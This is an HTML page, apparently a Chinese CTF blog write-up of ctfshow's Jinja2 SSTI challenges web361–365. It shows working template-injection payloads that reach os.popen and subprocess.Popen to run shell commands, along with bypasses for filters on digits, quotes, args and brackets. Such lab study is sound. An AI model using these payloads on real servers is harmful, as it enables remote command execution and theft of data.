@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="web361#jinja2的ssti 既然知道了漏洞是什么，那首先就是要去找到注入点 但是在页面源代码和抓包里也没找到什么，扫目录也啥都没有 根据hello猜测参数可能是name或者id，测试后发现是name参数  测一下ssti漏洞 传入&#123;&#123;10*10&#125;&#125;出现100，初步判断存在ssti注入漏洞，接下来就是去拿类然后进行注入了 12345678第一步，拿到">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web入门SSTI篇--ctfshow">
+<meta property="og:url" content="https://wanth3f1ag.top/2025/01/27/web%E5%85%A5%E9%97%A8SSTI%E7%AF%87-ctfshow/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="web361#jinja2的ssti 既然知道了漏洞是什么，那首先就是要去找到注入点 但是在页面源代码和抓包里也没找到什么，扫目录也啥都没有 根据hello猜测参数可能是name或者id，测试后发现是name参数  测一下ssti漏洞 传入&#123;&#123;10*10&#125;&#125;出现100，初步判断存在ssti注入漏洞，接下来就是去拿类然后进行注入了 12345678第一步，拿到">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ssti--ctfshow/image-20250123181827853.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ssti--ctfshow/image-20250123182828976.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ssti--ctfshow/image-20250125000751747.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ssti--ctfshow/image-20250125001200443.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ssti--ctfshow/image-20250126165654033.png">
+<meta property="article:published_time" content="2025-01-26T17:05:41.000Z">
+<meta property="article:modified_time" content="2025-02-02T14:34:37.333Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="SSTI">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/ssti--ctfshow/image-20250123181827853.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>web入门SSTI篇--ctfshow</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">A6out</a></li><!--
+     --><!--
+       --><li><a href="/tags/">T6gs</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Catagory</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">s4arch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/01/22/RCE%E4%B9%8B%E6%97%A0%E5%9B%9E%E6%98%BErce/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/01/27/web%E5%85%A5%E9%97%A8SSTI%E7%AF%87-ctfshow/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/01/27/web%E5%85%A5%E9%97%A8SSTI%E7%AF%87-ctfshow/&text=web入门SSTI篇--ctfshow"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/01/27/web%E5%85%A5%E9%97%A8SSTI%E7%AF%87-ctfshow/&title=web入门SSTI篇--ctfshow"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/01/27/web%E5%85%A5%E9%97%A8SSTI%E7%AF%87-ctfshow/&is_video=false&description=web入门SSTI篇--ctfshow"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=web入门SSTI篇--ctfshow&body=Check out this article: https://wanth3f1ag.top/2025/01/27/web%E5%85%A5%E9%97%A8SSTI%E7%AF%87-ctfshow/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/01/27/web%E5%85%A5%E9%97%A8SSTI%E7%AF%87-ctfshow/&title=web入门SSTI篇--ctfshow"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/01/27/web%E5%85%A5%E9%97%A8SSTI%E7%AF%87-ctfshow/&title=web入门SSTI篇--ctfshow"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/01/27/web%E5%85%A5%E9%97%A8SSTI%E7%AF%87-ctfshow/&title=web入门SSTI篇--ctfshow"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/01/27/web%E5%85%A5%E9%97%A8SSTI%E7%AF%87-ctfshow/&title=web入门SSTI篇--ctfshow"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/01/27/web%E5%85%A5%E9%97%A8SSTI%E7%AF%87-ctfshow/&name=web入门SSTI篇--ctfshow&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/01/27/web%E5%85%A5%E9%97%A8SSTI%E7%AF%87-ctfshow/&t=web入门SSTI篇--ctfshow"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web361"><span class="toc-number">1.</span> <span class="toc-text">web361</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#jinja2%E7%9A%84ssti"><span class="toc-number">1.1.</span> <span class="toc-text">#jinja2的ssti</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web362"><span class="toc-number">2.</span> <span class="toc-text">web362</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E9%83%A8%E5%88%86%E6%95%B0%E5%AD%97"><span class="toc-number">2.1.</span> <span class="toc-text">#过滤部分数字</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%95%B0%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-number">2.2.</span> <span class="toc-text">绕过数字过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%94%A8%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E7%AE%97%E5%BC%8F"><span class="toc-number">2.2.1.</span> <span class="toc-text">1.用加减乘除算式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8subprocess-Popen"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.利用subprocess.Popen()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web363"><span class="toc-number">3.</span> <span class="toc-text">web363</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7"><span class="toc-number">3.1.</span> <span class="toc-text">#过滤单双引号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-number">3.2.</span> <span class="toc-text">绕过单双引号过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#request-%E6%97%81%E8%B7%AF%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.</span> <span class="toc-text">request 旁路注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web364"><span class="toc-number">4.</span> <span class="toc-text">web364</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A2%9E%E5%8A%A0%E8%BF%87%E6%BB%A4args"><span class="toc-number">4.1.</span> <span class="toc-text">#增加过滤args</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8chr%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6"><span class="toc-number">4.2.</span> <span class="toc-text">用chr拼接字符</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web365"><span class="toc-number">5.</span> <span class="toc-text">web365</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A2%9E%E5%8A%A0%E8%BF%87%E6%BB%A4%E4%B8%AD%E6%8B%AC%E5%8F%B7"><span class="toc-number">5.1.</span> <span class="toc-text">#增加过滤中括号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-getitem-%E7%BB%95%E8%BF%87"><span class="toc-number">5.2.</span> <span class="toc-text">使用_getitem_()绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-pop-%E7%BB%95%E8%BF%87"><span class="toc-number">5.3.</span> <span class="toc-text">使用.pop()绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web366"><span class="toc-number">6.</span> <span class="toc-text">web366</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A2%9E%E5%8A%A0%E8%BF%87%E6%BB%A4%E4%B8%8B%E5%88%92%E7%BA%BF"><span class="toc-number">6.1.</span> <span class="toc-text">#增加过滤下划线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#attr-request-values-%E5%8F%82%E6%95%B0-%E7%BB%95%E8%BF%87"><span class="toc-number">6.2.</span> <span class="toc-text">attr(request.values.参数)绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web367"><span class="toc-number">7.</span> <span class="toc-text">web367</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A2%9E%E5%8A%A0%E8%BF%87%E6%BB%A4os"><span class="toc-number">7.1.</span> <span class="toc-text">#增加过滤os</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web368"><span class="toc-number">8.</span> <span class="toc-text">web368</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A2%9E%E5%8A%A0%E8%BF%87%E6%BB%A4%E8%8A%B1%E6%8B%AC%E5%8F%B7"><span class="toc-number">8.1.</span> <span class="toc-text">#增加过滤花括号</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87lipsum%E8%8E%B7%E5%8F%96os%E6%A8%A1%E5%9D%97"><span class="toc-number">8.1.1.</span> <span class="toc-text">通过lipsum获取os模块</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web369"><span class="toc-number">9.</span> <span class="toc-text">web369</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A2%9E%E5%8A%A0%E8%BF%87%E6%BB%A4request"><span class="toc-number">9.1.</span> <span class="toc-text">#增加过滤request</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        web入门SSTI篇--ctfshow
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wanTh3flag</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-26T17:05:41.000Z" class="dt-published" itemprop="datePublished">2025-01-27</time>
+        
+        (Updated: <time datetime="2025-02-02T14:34:37.333Z" class="dt-updated" itemprop="dateModified">2025-02-02</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/ctfshow/">ctfshow</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/SSTI/" rel="tag">SSTI</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h1><h2 id="jinja2的ssti"><a href="#jinja2的ssti" class="headerlink" title="#jinja2的ssti"></a>#jinja2的ssti</h2><p><img src="/../image/achieve/202411/ssti--ctfshow/image-20250123181827853.png" alt="image-20250123181827853"></p>
+<p>既然知道了漏洞是什么，那首先就是要去找到注入点</p>
+<p>但是在页面源代码和抓包里也没找到什么，扫目录也啥都没有</p>
+<p>根据hello猜测参数可能是name或者id，测试后发现是name参数</p>
+<p><img src="/../image/achieve/202411/ssti--ctfshow/image-20250123182828976.png" alt="image-20250123182828976"></p>
+<p>测一下ssti漏洞</p>
+<p>传入<code>&#123;&#123;10*10&#125;&#125;</code>出现100，初步判断存在ssti注入漏洞，接下来就是去拿类然后进行注入了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">第一步，拿到当前类，也就是用__class__</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__&#125;&#125;</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br><span class="line">第二步，拿到基类，这里可以用__base__，也可以用__mro__</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__base__&#125;&#125;</span><br><span class="line">&lt;class &#x27;object&#x27;&gt;</span><br><span class="line">第三步，拿到基类的子类，用__subclasses__()</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们找&lt;class ‘os._wrap_close’&gt;，大多数利用的是<code>os._wrap_close</code>这个类，可以执行命令，但是需要注意的是，这个类是python的标准库，所以需要在python环境下运行。</p>
+<p>然后找到这个类的下标是在132，选择一下这个类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__base__.subclasses__()[132]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>找到了后面就调用里面的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125; </span><br></pre></td></tr></table></figure>
+
+<p>解释一下这个payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__: 获取空字符串的类，即str。</span><br><span class="line">.__bases__[0]: 获取str类的基类，即object。object是所有Python类的基类。</span><br><span class="line">.__subclasses__(): 获取object类所有的直接子类列表。</span><br><span class="line">[132]: 选择列表中的第133个子类（因为索引是从0开始的）。这个特定的子类是不确定的，因为它取决于Python的实现和可能加载的其他模块。</span><br><span class="line">.__init__: 获取该子类的初始化方法（如果存在的话）。</span><br><span class="line">.__globals__: 获取定义__init__方法的模块的全局变量字典。</span><br><span class="line">[&#x27;popen&#x27;]: 从全局变量字典中获取名为popen的引用。这通常指的是os.popen函数，该函数用于执行一个命令并返回一个文件对象。</span><br></pre></td></tr></table></figure>
+
+<h1 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h1><h2 id="过滤部分数字"><a href="#过滤部分数字" class="headerlink" title="#过滤部分数字"></a>#过滤部分数字</h2><p>后面在传下标时候出了问题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[132]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/ssti--ctfshow/image-20250125000751747.png" alt="image-20250125000751747"></p>
+<p>应该是数字被过滤了，我们绕过一下</p>
+<h2 id="绕过数字过滤"><a href="#绕过数字过滤" class="headerlink" title="绕过数字过滤"></a>绕过数字过滤</h2><h3 id="1-用加减乘除算式"><a href="#1-用加减乘除算式" class="headerlink" title="1.用加减乘除算式"></a>1.用加减乘除算式</h3><p>用140-8</p>
+<p><img src="/../image/achieve/202411/ssti--ctfshow/image-20250125001200443.png" alt="image-20250125001200443"></p>
+<h3 id="2-利用subprocess-Popen"><a href="#2-利用subprocess-Popen" class="headerlink" title="2.利用subprocess.Popen()"></a>2.利用subprocess.Popen()</h3><p><code>subprocess.Popen()</code> 是 Python 中 <code>subprocess</code> 模块的一个类</p>
+<p>主要功能</p>
+<ol>
+<li><strong>启动外部程序</strong>：可以运行外部命令或程序，无论是系统命令还是其他可执行文件。</li>
+<li><strong>输入输出重定向</strong>：能够重定向子进程的标准输入、标准输出和标准错误流。</li>
+<li><strong>进程管理</strong>：可以控制子进程的执行，获取其返回值，甚至在需要时终止它。</li>
+</ol>
+<p>基础语法结构</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">process = subprocess.Popen(</span><br><span class="line">    args,                     <span class="comment"># 要执行的命令及其参数</span></span><br><span class="line">    bufsize=-<span class="number">1</span>,              <span class="comment"># 缓冲区大小，-1表示使用系统默认</span></span><br><span class="line">    executable=<span class="literal">None</span>,         <span class="comment"># 指定要执行的程序，默认根据 args 来确定</span></span><br><span class="line">    stdin=<span class="literal">None</span>,              <span class="comment"># 标准输入的重定向</span></span><br><span class="line">    stdout=<span class="literal">None</span>,             <span class="comment"># 标准输出的重定向</span></span><br><span class="line">    stderr=<span class="literal">None</span>,             <span class="comment"># 标准错误的重定向</span></span><br><span class="line">    preexec_fn=<span class="literal">None</span>,        <span class="comment"># Unix特有，子进程执行前调用的函数</span></span><br><span class="line">    close_fds=<span class="literal">True</span>,         <span class="comment"># 关闭子进程的文件描述符</span></span><br><span class="line">    shell=<span class="literal">False</span>,             <span class="comment"># 是否通过shell执行命令</span></span><br><span class="line">    cwd=<span class="literal">None</span>,                <span class="comment"># 子进程的工作目录</span></span><br><span class="line">    env=<span class="literal">None</span>,                <span class="comment"># 自定义的环境变量</span></span><br><span class="line">    universal_newlines=<span class="literal">False</span>,<span class="comment"># 是否将输入输出转换为文本模式</span></span><br><span class="line">    startupinfo=<span class="literal">None</span>,        <span class="comment"># Windows特有，用于进程启动信息</span></span><br><span class="line">    creationflags=<span class="number">0</span>          <span class="comment"># Windows特有，创建进程的标志</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>那我们这道题的payload就是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">407</span>](<span class="string">&quot;cat /flag&quot;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其实绕过的方法就是去凑数字或者是采用其他类，这个主要是看积累了</p>
+<h1 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h1><h2 id="过滤单双引号"><a href="#过滤单双引号" class="headerlink" title="#过滤单双引号"></a>#过滤单双引号</h2><p>在第一步查看当前类就卡住了，一开始以为是class被过滤了，后面发现是单双引号被过滤了</p>
+<h2 id="绕过单双引号过滤"><a href="#绕过单双引号过滤" class="headerlink" title="绕过单双引号过滤"></a>绕过单双引号过滤</h2><p>我们可以用括号去绕过前面的单双引号</p>
+<p>但是我们到后面调用这个popen方法的时候好像这样是绕不过去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__()[132].__init__.__globals__[popen]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以用request内置对象去进行绕过</p>
+<h2 id="request-旁路注入"><a href="#request-旁路注入" class="headerlink" title="request 旁路注入"></a>request 旁路注入</h2><p>通过request内置对象去得到请求的信息，从而传递参数</p>
+<p>GET方式，用request.args传递参数(GET传参)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;&amp;a=popen&amp;b=ls /</span><br><span class="line">拿flag</span><br><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;&amp;a=popen&amp;b=cat /flag</span><br></pre></td></tr></table></figure>
+
+<p>POST方式，利用request.values传递参数(POST或者GET传参)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.values.a](request.values.b).read()&#125;&#125;&amp;a=popen&amp;b=ls /</span><br></pre></td></tr></table></figure>
+
+<p>Cookie方式，利用request.cookies传递参数(Cookie传参)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.cookies.a](request.cookies.b).read()&#125;&#125;&amp;a=popen&amp;b=ls /</span><br></pre></td></tr></table></figure>
+
+<h1 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h1><h2 id="增加过滤args"><a href="#增加过滤args" class="headerlink" title="#增加过滤args"></a>#增加过滤args</h2><p>测试后发现是过滤了引号和args</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;&amp;a=popen&amp;b=ls</span><br></pre></td></tr></table></figure>
+
+<p>说明上一道题确实预期解是request内置对象去传参</p>
+<p>args被过滤了，我们可以试一下post方法的values</p>
+<p>用request的values进行post传参</p>
+<p><img src="/../image/achieve/202411/ssti--ctfshow/image-20250126165654033.png" alt="image-20250126165654033"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.values.a](request.values.b).read()&#125;&#125;&amp;a=popen&amp;b=ls /</span><br></pre></td></tr></table></figure>
+
+<p>另外我们讲另一种方法</p>
+<h2 id="用chr拼接字符"><a href="#用chr拼接字符" class="headerlink" title="用chr拼接字符"></a>用chr拼接字符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;%set%20char=config.__class__.__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;[].__class__.__base__.__subclasses__()[132].__init__.__globals__.popen(char(99)%2bchar(97)%2bchar(116)%2bchar(32)%2bchar(47)%2bchar(102)%2bchar(108)%2bchar(97)%2bchar(103)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h1><h2 id="增加过滤中括号"><a href="#增加过滤中括号" class="headerlink" title="#增加过滤中括号"></a>#增加过滤中括号</h2><p>测试后发现中括号被过滤了，我们可以用使用gititem绕过</p>
+<h2 id="使用-getitem-绕过"><a href="#使用-getitem-绕过" class="headerlink" title="使用_getitem_()绕过"></a>使用_<em>getitem</em>_()绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原payload</span><br><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__()[132].__init__.__globals__.popen(request.values.a).read()&#125;&#125;&amp;a=cat /flag</span><br><span class="line">绕过payload</span><br><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(132).__init__.__globals__.popen(request.values.a).read()&#125;&#125;&amp;a=cat /flag</span><br></pre></td></tr></table></figure>
+
+<p>也可以使用pop绕过</p>
+<h2 id="使用-pop-绕过"><a href="#使用-pop-绕过" class="headerlink" title="使用.pop()绕过"></a>使用.pop()绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原payload</span><br><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__()[132].__init__.__globals__.popen(request.values.a).read()&#125;&#125;&amp;a=cat /flag</span><br><span class="line">绕过payload</span><br><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__().pop(132).__init__.__globals__.popen(request.values.a).read()&#125;&#125;&amp;a=cat /flag</span><br></pre></td></tr></table></figure>
+
+<p>以上两种方法也可以结合request去使用</p>
